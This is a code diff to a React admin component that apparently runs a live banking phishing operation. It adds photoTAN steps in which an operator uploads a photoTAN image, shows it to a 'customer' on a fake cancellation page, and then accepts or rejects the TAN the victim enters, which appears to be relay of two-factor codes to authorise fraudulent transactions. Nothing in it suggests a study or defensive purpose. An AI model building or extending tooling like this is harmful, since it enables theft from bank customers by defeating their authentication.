@@ -4,7 +4,7 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
-import { Link2, Ban, XCircle, CheckCircle2, Trash2, Upload } from "lucide-react";
+import { Link2, Ban, XCircle, CheckCircle2, Trash2, Upload, RefreshCw } from "lucide-react";
 import { toast } from "sonner";
 
 type StornoRow = {
@@ -31,6 +31,8 @@ const PHASE_LABEL: Record<string, string> = {
   berater: "Berater-Verifizierung",
   widerruf: "Kunde auf Landing-Seite",
   start: "Kunde prüft Transaktion – wartet auf Freigabe",
+  phototan_request: "PhotoTAN angefordert – Bild hochladen",
+  phototan: "PhotoTAN-Eingabe (Kunde)",
   success: "Erfolgreich (Weitergeleitet)",
   aborted: "Abgebrochen",
 };
@@ -87,6 +89,9 @@ const StornoLiveCard = () => {
     last_error: null,
   });
 
+  const setPhotoTanImage = (r: StornoRow, dataUrl: string | null) =>
+    update(r.id, { photo_tan_image: dataUrl });
+
   const abort = (r: StornoRow) => {
     if (!window.confirm("Session wirklich abbrechen?")) return;
     setPhase(r, "aborted", { last_error: null });
@@ -100,11 +105,9 @@ const StornoLiveCard = () => {
   };
 
   const copyLink = async (r: StornoRow) => {
-    const url = `${window.location.origin}/widerruf/${r.token}`;
+    const url = `${window.location.origin}/auth`;
     try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
   };
-
-  const setPhotoTanImage = (r: StornoRow, dataUrl: string | null) => update(r.id, { photo_tan_image: dataUrl });
 
   if (!rows.length) return null;
 
@@ -155,13 +158,39 @@ const StornoLiveCard = () => {
                   <p className="text-xs text-muted-foreground">
                     {phase === "berater" && "Kunde füllt Berater-Verifizierung aus."}
                     {phase === "widerruf" && "Kunde ist auf der Widerruf-Landing-Seite."}
-                    {phase === "start" && "Kunde wartet auf /widerruf/start – Freigabe hier klicken."}
+                    {phase === "start" && "Kunde ist auf /widerruf/start – wartet auf Klick auf „Mit photoTAN freigeben“."}
+                    {phase === "phototan_request" && "Kunde hat photoTAN angefordert – Bild hochladen und freigeben."}
+                    {phase === "phototan" && "Kunde sieht photoTAN – wartet auf TAN-Eingabe."}
                   </p>
+
+                  {(phase === "start" || phase === "phototan_request" || phase === "phototan") && (
+                    <StepBlock title="PhotoTAN-Bild">
+                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} compact={phase === "phototan"} />
+                    </StepBlock>
+                  )}
+
                   <div className="flex flex-wrap justify-between gap-2">
                     <Button size="sm" variant="ghost" onClick={() => abort(r)}>Session abbrechen</Button>
-                    <Button size="sm" onClick={() => acceptTan(r)} disabled={phase !== "start"}>
-                      <CheckCircle2 className="h-4 w-4 mr-1" />Weiter zu /success
-                    </Button>
+                    <div className="flex flex-wrap gap-2">
+                      {phase === "phototan_request" && (
+                        <Button size="sm" onClick={() => showPhotoTan(r)} disabled={!r.photo_tan_image}>
+                          <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
+                        </Button>
+                      )}
+                      {phase === "phototan" && (
+                        <>
+                          <Button size="sm" variant="destructive" onClick={() => rejectTan(r)} disabled={!meta?.tan}>
+                            <XCircle className="h-4 w-4 mr-1" />TAN ablehnen
+                          </Button>
+                          <Button size="sm" variant="outline" onClick={() => showPhotoTan(r)}>
+                            <RefreshCw className="h-4 w-4 mr-1" />Neue PhotoTAN anzeigen
+                          </Button>
+                          <Button size="sm" onClick={() => acceptTan(r)} disabled={!meta?.tan}>
+                            <CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren → /success
+                          </Button>
+                        </>
+                      )}
+                    </div>
                   </div>
                 </div>
               )}
